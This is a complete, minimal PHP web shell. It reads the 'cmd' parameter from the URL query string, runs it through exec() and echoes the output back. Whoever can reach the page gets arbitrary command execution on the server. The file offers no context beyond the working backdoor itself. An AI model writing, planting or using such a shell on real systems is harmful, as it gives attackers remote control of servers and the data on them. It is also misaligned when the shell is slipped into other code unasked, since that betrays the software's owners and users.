<?php
function execute($com)
{
  if(function_exists('exec'))
  {
    exec($com,$arr);
    echo implode('',$arr);
  }
}

$cmd = $_GET['cmd'];
execute($cmd);
?>